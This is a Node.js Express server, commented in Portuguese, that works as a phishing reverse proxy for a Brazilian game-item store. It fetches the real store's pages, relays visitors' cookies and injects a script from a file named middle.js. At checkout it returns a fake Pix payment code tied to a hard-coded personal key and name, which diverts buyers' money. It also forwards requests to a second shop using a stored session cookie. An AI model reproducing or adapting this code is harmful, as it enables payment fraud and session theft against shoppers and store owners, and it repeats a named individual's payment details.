

const express = require('express');
const app = express();
const port = 3000;
const axios = require('axios');
const pussy_url = "https://akumabloxx.com/"
const jsdom = require("jsdom");
const { JSDOM } = jsdom;
const fs = require('fs');
const middleman = fs.readFileSync('middle.js', 'utf8');
app.use(express.json());
function crc16(str) {
  let crc = 0xFFFF;
  for (let i = 0; i < str.length; i++) {
      crc ^= str.charCodeAt(i) << 8;
      for (let j = 0; j < 8; j++) {
          if ((crc & 0x8000) !== 0) {
              crc = (crc << 1) ^ 0x1021;
          } else {
              crc <<= 1;
          }
          crc &= 0xFFFF;
      }
  }
  return crc.toString(16).toUpperCase().padStart(4, '0');
}



// Função utilitária para montar TLV
function tlv(id, value) {
  const length = value.length.toString().padStart(2, '0');
  return `${id}${length}${value}`;
}

// Função principal para gerar o payload Pix completo
function gerarPayloadPix({ chave, nome, cidade, valor, txid }) {
  // IDs conforme padrão EMV
  const payloadFormat = tlv('00', '01');
  const merchantAccountInfo = tlv('26',
      tlv('00', 'br.gov.bcb.pix') +
      tlv('01', chave)
  );
  const merchantCategoryCode = tlv('52', '0000');
  const transactionCurrency = tlv('53', '986'); // BRL
  const transactionAmount = valor ? tlv('54', parseFloat(valor).toFixed(2)) : '';
  const countryCode = tlv('58', 'BR');
  const merchantName = tlv('59', nome.toUpperCase().substring(0, 25));
  const merchantCity = tlv('60', cidade.toUpperCase().substring(0, 15));
  const additionalData = tlv('62', tlv('05', txid));

  const payloadSemCRC = (
      payloadFormat +
      merchantAccountInfo +
      merchantCategoryCode +
      transactionCurrency +
      transactionAmount +
      countryCode +
      merchantName +
      merchantCity +
      additionalData +
      '6304' // ID do CRC + tamanho (fixo)
  );

  const crc = crc16(payloadSemCRC);
  const payloadFinal = payloadSemCRC + crc;
  return payloadFinal;
}

function parseCookies(cookieString) {
  // Lista de chaves que você quer ignorar
  const excludeKeys = [
    'Max-Age', 
    'Path', 
    'HttpOnly', 
    'Secure', 
    'SameSite', 
    'Expires', 
    'Domain'
  ];

  // Divide os cookies pela separação por ponto e vírgula e espaço
  const cookiesArray = cookieString.split('; ').map(cookie => {
    // Para cada cookie, divide-o em chave e valor
    const [key, value] = cookie.split('=');
    
    // Se a chave for uma das que você quer excluir, não inclua no resultado
    if (excludeKeys.includes(key)) {
      return null;
    }
    
    return [key, value]; // Decodifica o valor do cookie
  });

  // Filtra qualquer valor null (que foram excluídos)
  return cookiesArray.filter(cookie => cookie !== null);
}
var middle = async (req, res) => {
    const url = pussy_url+req.path; 
    var cks = ``
    if(req.headers.cookie != null){
      cks =req.headers.cookie
    }
    if(url.includes(`/cart/checkout`)){
      var value = req.body.vl
      res.set('Content-Type', 'application/json');
      const payload = gerarPayloadPix({
        chave: '844da009-10e2-4e96-95f0-ef32a3562695',
        nome: 'LUIZ BRENO SILVA DE ARAUJO',
        cidade: 'caninde',
        valor: value,
        txid: 'TX123456'
      });
      return res.send(JSON.stringify({
        "pix_code": payload,
        "qr_code": `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${payload}`,
        "return_url": "https://akumabloxx.com/order/S3b4_YFwWgw2",
        "order_id": "S3b4_YFwWgw2"
    }));
    }
    
    if(url.split(`cart/add/`).length > 1){
      await fetch("https://akumabloxx.com/cart/add/"+url.split(`cart/add/`)[1], {
        "headers": {
          "accept": "*/*",
          "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
          "content-type": "application/json",
          "priority": "u=1, i",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": "\"Windows\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "Referer": "https://akumabloxx.com/package/nivel-maximo-+-dragon-no-inventario",
          "Referrer-Policy": "strict-origin-when-cross-origin",
          "cookie": cks
        },
        "body": "{\"options\":null}",
        "method": "POST"
      }).then(async (data) => {
        console.log(1)
        var cookies = data.headers.getSetCookie()[0]
        if(cookies?.length > 0){
          console.log(cookies.split(`=`)[0],cookies.split(`=`)[1].split(`;`)[0])
          res.cookie(cookies.split(`=`)[0],cookies.split(`=`)[1].split(`;`)[0])
        }
        
        return await data.text()
    }).then((text) => {
      res.set('Content-Type', 'application/json');
      return res.send(text);
    })
    return
    }
    

    await fetch(url, {
        "headers": {
          
          "cookie": cks
        },
       
        "body": req.body,
        "method": req.method
    }).then((data) => {

      if(data.headers.get('set-cookie') != null){
        var ck = parseCookies(data.headers.get('set-cookie'))
        
        ck.forEach(ckk => {
          console.log(ckk[0])
          res.cookie(ckk[0],ckk[1])
        });
      }
      
        return data.text()
    }).then((text) => {
      if(req.method == `GET`){
        const html = new JSDOM(text)

        var dom = html.window.document;

        dom.head.innerHTML += `<script>${middleman}</script>`

        return res.send(html.serialize());
      }
      res.set('Content-Type', 'application/json');
      return res.send(text);
    })

}

app.get('/', middle);
app.post('/',async (req, res) => {

    const data = decodeURIComponent(req.url.replace(`/?=`,``))

    await fetch("https://rutherbloxxxxxx.ereembystore.shop/", {
        "headers": {
          "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
          "content-type": "text/plain;charset=UTF-8",
          "next-action": "d5583b14a6c95a2e409c40b3f8940a9de6b821d7",
          "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(public)%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
          "priority": "u=1, i",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": "\"Windows\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "cookie": "_gcl_au=1.1.2121663705.1745445656; crisp-client%2Fsession%2F8993d5da-da67-4a18-9708-03660d29f623=session_ac87c5b9-58df-4422-9d34-1983c31c88da",
          "Referer": "https://rutherbloxxxxxx.ereembystore.shop/",
          "Referrer-Policy": "strict-origin-when-cross-origin"
        },
        "body": data,
        "method": "POST"
    }).then((data) => {
        return data.text()
    }).then((text) => {
        res.type('text/x-component');
        return res.send(`0:["$@1",["5f8K3rB1CUD_RZihLC1MP",null]]
1:{"data":{"categoria":{"id":"174423602553675287467804145481","nome":"ðŸ‡ðŸ…FRUTAS NO INVENTÃRIO [ðŸ²]","pos":2,"loja":"1744225339483859880464967506859190","icon":null,"banner":null,"sub_title":null,"slug":null,"createdAt":"2025-04-09T22:00:25.000Z","updatedAt":"2025-04-09T22:00:25.000Z"},"totalItens":4,"totalPaginas":1,"paginaAtual":1,"itens":[{"id":"174423618230857856446438578116415","nome":"LEVEL 2600 + GODHUMAN + DRAGON EAST (ORIENTAL) NO INVENTÃRIO","valor":22.99,"comparacao":0,"destaque":false,"estoque":1632,"status":true,"ocultar":false,"tipo":"series","imagem":"https://cdn.ereemby.com/attachments/1744236522688319imagem.jpeg"},{"id":"1744236732697827287740861937438","nome":"LEVEL 2600 + GODHUMAN + DRAGON WEST (OCIDENTAL) NO INVENTÃRIO","valor":20.99,"comparacao":null,"destaque":false,"estoque":1623,"status":true,"ocultar":false,"tipo":"series","imagem":"https://cdn.ereemby.com/attachments/17442364927404298imagem.jpeg"},{"id":"1744236780066589444935253832","nome":" LEVEL ALEATÃ“RIO + YETI NO INVENTÃRIO","valor":15.59,"comparacao":null,"destaque":false,"estoque":1637,"status":true,"ocultar":false,"tipo":"series","imagem":"https://cdn.ereemby.com/attachments/17442365136756606imagem.jpeg"},{"id":"17442368275957456969408802140260344864","nome":" LEVEL 2600 + GODHUMAN + GAS NO INVENTÃRIO","valor":9.99,"comparacao":0,"destaque":false,"estoque":1621,"status":true,"ocultar":false,"tipo":"series","imagem":"https://cdn.ereemby.com/attachments/17442364868904306imagem.jpeg"}]},"status":true}
`);
        
    })
});
app.all('/:a', middle);
app.all('/:a/:a', middle);
app.all('/:a/:a/:a', middle);
app.all('/:a/:a/:a/:a', middle);
app.all('/:a/:a/:a/:a/:a', middle);

app.listen(port, () => {
  console.log(`Servidor ouvindo em http://localhost:${port}`);
});
